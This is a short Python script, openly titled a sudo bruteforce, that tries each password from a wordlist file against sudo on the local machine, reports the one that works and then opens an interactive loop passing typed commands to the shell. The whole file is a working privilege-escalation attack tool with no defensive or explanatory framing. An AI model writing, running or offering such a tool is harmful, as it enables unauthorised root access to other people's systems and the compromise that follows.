import os
import subprocess
import time
import sys

print('Sudo bruteforce started...')

current_dir = os.path.dirname(os.path.abspath(__file__))
file_path = os.path.join(current_dir, "john.txt")

def bruteforce():
        global text
        with open(file_path) as file:
                for line in file:
                        password = line.strip()
                        command = "ls"   
                        process = subprocess.Popen(['sudo', '-S'] + command.split(),
                                stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                universal_newlines=True)
                        stdout, stderr = process.communicate(input=password + '\n')
                        
                        try:
                                output = subprocess.check_output(['sudo', '-n', 'true'], stderr=subprocess.STDOUT)
                                print('Access Granted!')
                                print('Sudo password is: ' + line.strip() + '\n')
                                print(stdout) 
                                break
                        except subprocess.CalledProcessError:
                                print('Access Denied: ' + line.strip())
                                print(stdout)           

bruteforce()

while True:
        commander = input('root@sudo_bruteforce ')
        os.system(commander)   
        
